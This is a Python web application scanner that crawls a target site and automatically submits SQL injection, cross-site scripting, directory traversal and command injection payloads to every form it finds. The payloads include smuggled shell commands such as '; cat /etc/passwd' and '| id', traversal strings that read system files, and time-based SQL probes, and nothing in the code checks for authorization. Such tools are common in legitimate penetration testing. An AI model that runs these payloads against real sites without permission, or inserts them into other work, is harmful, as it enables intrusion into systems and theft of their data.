
"""
Comprehensive web application security testing
"""
import requests
import logging
import time
from urllib.parse import urljoin, urlparse
from typing import List, Dict, Any
from bs4 import BeautifulSoup

class WebAppTester:
    def __init__(self):
        self.logger = logging.getLogger(__name__)
        self.session = requests.Session()
        self.session.headers.update({
            'User-Agent': 'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36'
        })
        
    def spider_website(self, base_url: str, max_pages: int = 50) -> List[str]:
        """Spider website to discover pages and endpoints"""
        discovered_urls = set()
        to_visit = [base_url]
        visited = set()
        
        while to_visit and len(discovered_urls) < max_pages:
            url = to_visit.pop(0)
            if url in visited:
                continue
                
            try:
                response = self.session.get(url, timeout=10)
                if response.status_code == 200:
                    discovered_urls.add(url)
                    visited.add(url)
                    
                    # Parse HTML for more links
                    soup = BeautifulSoup(response.text, 'html.parser')
                    for link in soup.find_all('a', href=True):
                        new_url = urljoin(url, link['href'])
                        if urlparse(new_url).netloc == urlparse(base_url).netloc:
                            if new_url not in visited:
                                to_visit.append(new_url)
                                
                time.sleep(0.5)  # Rate limiting
                
            except Exception as e:
                self.logger.warning(f"Failed to spider {url}: {e}")
                
        return list(discovered_urls)
    
    def test_sql_injection(self, url: str, params: Dict[str, str]) -> List[Dict[str, Any]]:
        """Test for SQL injection vulnerabilities"""
        vulnerabilities = []
        sql_payloads = [
            "'",
            "' OR '1'='1",
            "' UNION SELECT 1,2,3--",
            "'; WAITFOR DELAY '00:00:05'--",
            "' AND (SELECT COUNT(*) FROM sysobjects)>0--"
        ]
        
        for param_name in params:
            for payload in sql_payloads:
                test_params = params.copy()
                test_params[param_name] = payload
                
                try:
                    start_time = time.time()
                    response = self.session.get(url, params=test_params, timeout=10)
                    response_time = time.time() - start_time
                    
                    # Check for SQL error messages
                    error_indicators = [
                        "mysql_fetch_array",
                        "ORA-01756",
                        "Microsoft OLE DB",
                        "SQL syntax",
                        "sqlite3.OperationalError"
                    ]
                    
                    for indicator in error_indicators:
                        if indicator.lower() in response.text.lower():
                            vulnerabilities.append({
                                "type": "SQL Injection",
                                "parameter": param_name,
                                "payload": payload,
                                "evidence": indicator,
                                "severity": "High"
                            })
                            break
                    
                    # Check for time-based SQLi
                    if response_time > 5:
                        vulnerabilities.append({
                            "type": "Time-based SQL Injection",
                            "parameter": param_name,
                            "payload": payload,
                            "evidence": f"Response time: {response_time:.2f}s",
                            "severity": "High"
                        })
                    
                except Exception as e:
                    self.logger.warning(f"SQLi test failed for {param_name}: {e}")
                    
        return vulnerabilities
    
    def test_xss(self, url: str, params: Dict[str, str]) -> List[Dict[str, Any]]:
        """Test for Cross-Site Scripting vulnerabilities"""
        vulnerabilities = []
        xss_payloads = [
            "<script>alert('XSS')</script>",
            "<img src=x onerror=alert('XSS')>",
            "<svg onload=alert('XSS')>",
            "javascript:alert('XSS')",
            "<iframe src=javascript:alert('XSS')>"
        ]
        
        for param_name in params:
            for payload in xss_payloads:
                test_params = params.copy()
                test_params[param_name] = payload
                
                try:
                    response = self.session.get(url, params=test_params, timeout=10)
                    
                    if payload in response.text:
                        vulnerabilities.append({
                            "type": "Reflected XSS",
                            "parameter": param_name,
                            "payload": payload,
                            "evidence": "Payload reflected in response",
                            "severity": "Medium"
                        })
                        
                except Exception as e:
                    self.logger.warning(f"XSS test failed for {param_name}: {e}")
                    
        return vulnerabilities
    
    def test_directory_traversal(self, url: str, params: Dict[str, str]) -> List[Dict[str, Any]]:
        """Test for directory traversal vulnerabilities"""
        vulnerabilities = []
        traversal_payloads = [
            "../../../etc/passwd",
            "..\\..\\..\\windows\\system32\\drivers\\etc\\hosts",
            "....//....//....//etc/passwd",
            "%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd"
        ]
        
        for param_name in params:
            for payload in traversal_payloads:
                test_params = params.copy()
                test_params[param_name] = payload
                
                try:
                    response = self.session.get(url, params=test_params, timeout=10)
                    
                    # Check for file content indicators
                    if "root:x:0:0:" in response.text or "[drivers]" in response.text:
                        vulnerabilities.append({
                            "type": "Directory Traversal",
                            "parameter": param_name,
                            "payload": payload,
                            "evidence": "System file content detected",
                            "severity": "High"
                        })
                        
                except Exception as e:
                    self.logger.warning(f"Directory traversal test failed for {param_name}: {e}")
                    
        return vulnerabilities
    
    def test_command_injection(self, url: str, params: Dict[str, str]) -> List[Dict[str, Any]]:
        """Test for command injection vulnerabilities"""
        vulnerabilities = []
        command_payloads = [
            "; whoami",
            "| id", 
            "&& uname -a",
            "; cat /etc/passwd",
            "| ping -c 3 127.0.0.1"
        ]
        
        for param_name in params:
            for payload in command_payloads:
                test_params = params.copy()
                test_params[param_name] = payload
                
                try:
                    response = self.session.get(url, params=test_params, timeout=15)
                    
                    # Check for command output indicators
                    command_indicators = ["uid=", "gid=", "Linux", "root:x:", "PING"]
                    
                    for indicator in command_indicators:
                        if indicator in response.text:
                            vulnerabilities.append({
                                "type": "Command Injection",
                                "parameter": param_name,
                                "payload": payload,
                                "evidence": f"Command output detected: {indicator}",
                                "severity": "Critical"
                            })
                            break
                            
                except Exception as e:
                    self.logger.warning(f"Command injection test failed for {param_name}: {e}")
                    
        return vulnerabilities
    
    def comprehensive_test(self, target_url: str) -> Dict[str, Any]:
        """Run comprehensive web application test"""
        results = {
            "target": target_url,
            "discovered_urls": [],
            "vulnerabilities": [],
            "forms": [],
            "technologies": []
        }
        
        # Spider the website
        self.logger.info(f"Spidering website: {target_url}")
        results["discovered_urls"] = self.spider_website(target_url)
        
        # Test each discovered URL
        for url in results["discovered_urls"]:
            # Extract forms and parameters
            try:
                response = self.session.get(url, timeout=10)
                soup = BeautifulSoup(response.text, 'html.parser')
                
                # Test forms
                for form in soup.find_all('form'):
                    form_data = {}
                    for input_field in form.find_all(['input', 'textarea', 'select']):
                        name = input_field.get('name')
                        if name:
                            form_data[name] = 'test'
                    
                    if form_data:
                        results["forms"].append({"url": url, "fields": form_data})
                        
                        # Test vulnerabilities
                        results["vulnerabilities"].extend(self.test_sql_injection(url, form_data))
                        results["vulnerabilities"].extend(self.test_xss(url, form_data))
                        results["vulnerabilities"].extend(self.test_directory_traversal(url, form_data))
                        results["vulnerabilities"].extend(self.test_command_injection(url, form_data))
                
            except Exception as e:
                self.logger.warning(f"Failed to test {url}: {e}")
                
        return results
